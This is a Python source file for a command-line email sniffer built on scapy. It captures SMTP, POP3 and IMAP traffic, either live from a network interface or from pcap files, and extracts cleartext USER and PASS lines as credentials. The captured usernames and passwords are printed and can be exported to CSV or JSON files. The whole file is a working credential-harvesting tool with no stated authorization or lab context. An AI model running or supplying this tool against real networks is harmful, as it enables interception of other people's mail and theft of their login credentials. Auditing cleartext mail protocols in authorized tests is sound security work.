#!/usr/bin/env python3
import argparse
import re
import threading
import json
import csv
from scapy.all import sniff, rdpcap, TCP, IP, Raw
from colorama import init, Fore

init(autoreset=True)

# tuple to define standard mail protocol ports
MAIL_PORTS = {
    "SMTP": 25,
    "POP3": 110,
    "IMAP": 143
}

credentials = []              # global list to store credentials
lock = threading.Lock()       # thread lock for safe access to shared data

# function to extract user/pass from payload and print/save
def extract_credentials(proto, payload):
    lines = payload.splitlines()
    user, pwd = None, None

    for line in lines:
        if re.search(r"user\s+", line, re.IGNORECASE):
            user = line.strip()
        elif re.search(r"pass\s+", line, re.IGNORECASE):
            pwd = line.strip()

    if user or pwd:
        with lock:
            credentials.append((proto, user, pwd))

        print(Fore.GREEN + f"[{proto}] Credentials Found:\n  {user}\n  {pwd}\n" + "-" * 40)

# function to process individual packets and search for credentials or smtp data
def email_pkt_callback(pkt, args):
    if pkt.haslayer(TCP) and pkt.haslayer(Raw):
        sport = pkt[TCP].sport
        dport = pkt[TCP].dport
        ip_src = pkt[IP].src
        ip_dst = pkt[IP].dst

        try:
            payload = pkt[Raw].load.decode(errors='ignore')
        except:
            return

        for proto, port in MAIL_PORTS.items():
            if args.proto != "all" and args.proto.lower() != proto.lower():
                continue
            if sport == port or dport == port:
                if any(k in payload.lower() for k in ["user", "pass", "auth", "login"]):
                    print(Fore.CYAN + f"[{proto}] {ip_src} -> {ip_dst}")
                    print(payload.strip())
                    print(Fore.YELLOW + "=" * 50)
                    extract_credentials(proto, payload)
                elif proto == "SMTP" and any(k in payload for k in ["MAIL FROM:", "RCPT TO:"]):
                    print(Fore.MAGENTA + f"[SMTP DATA] {ip_src} -> {ip_dst}")
                    print(payload.strip())
                    print("=" * 50)

                if args.save_all:
                    with lock:
                        with open("email_sniffer_log.txt", "a", encoding='utf-8') as f:
                            f.write(f"[{proto}] {ip_src} -> {ip_dst}\n{payload.strip()}\n{'='*50}\n")

# function to sniff live network traffic
def live_sniffer(args):
    selected_ports = [p for proto, p in MAIL_PORTS.items()
                      if args.proto == "all" or proto.lower() == args.proto.lower()]
    ports_filter = " or ".join([f"tcp port {p}" for p in selected_ports])

    sniff(
        iface=args.iface,
        filter=ports_filter,
        prn=lambda pkt: email_pkt_callback(pkt, args),
        store=False,
        count=args.count
    )

# function to process packets from a pcap file
def pcap_processor(args):
    try:
        packets = rdpcap(args.pcap)
        print(Fore.GREEN + f"|*| Processing {len(packets)} packets from {args.pcap}...")
        for pkt in packets:
            email_pkt_callback(pkt, args)
    except Exception as e:
        print(Fore.RED + f"|!| Error reading pcap file: {e}")

# function to export captured credentials to csv or json
def export_credentials(format):
    if format == "csv":
        with open("email_credentials.csv", "w", newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerow(["Protocol", "Username", "Password"])
            writer.writerows(credentials)
        print(Fore.GREEN + "|+| Credentials exported to email_credentials.csv")

    elif format == "json":
        json_data = [{"protocol": proto, "username": user, "password": pwd}
                     for proto, user, pwd in credentials]
        with open("email_credentials.json", "w", encoding='utf-8') as f:
            json.dump(json_data, f, indent=4)
        print(Fore.GREEN + "|+| Credentials exported to email_credentials.json")

# arg parser for cli customizability
def main():
    parser = argparse.ArgumentParser(description="Python Email (SMTP/POP3/IMAP) Protocol Sniffer")
    parser.add_argument("-i", "--iface", help="Network interface to sniff (live mode only)")
    parser.add_argument("-c", "--count", type=int, default=0, help="Number of packets to sniff (0 = unlimited)")
    parser.add_argument("--proto", choices=["smtp", "pop3", "imap", "all"], default="all", help="Protocol to filter")
    parser.add_argument("--save-all", action="store_true", help="Save all captured data to file")
    parser.add_argument("--pcap", help="Path to PCAP file for offline analysis")
    parser.add_argument("--output-format", choices=["csv", "json", "none"], default="none",
                        help="Export captured credentials to a file")

    args = parser.parse_args()

    if args.pcap:
        print(Fore.GREEN + f"|*| Reading packets from {args.pcap}...")
        pcap_processor(args)
    elif args.iface:
        print(Fore.GREEN + f"|*| Starting {args.proto.upper()} live sniffer on {args.iface}... Press Ctrl+C to stop.")
        t = threading.Thread(target=live_sniffer, args=(args,), daemon=True)
        t.start()
        t.join()
    else:
        print(Fore.RED + "|!| You must specify either --iface for live sniffing or --pcap for offline analysis.")
        return

    if credentials:
        print(Fore.GREEN + "\n|*| Summary of captured credentials:")
        for proto, u, p in credentials:
            print(f"  [{proto}] {u} | {p}")
        if args.output_format != "none":
            export_credentials(args.output_format)
    else:
        print(Fore.RED + "|-| No credentials captured.")

if __name__ == "__main__":
    main()
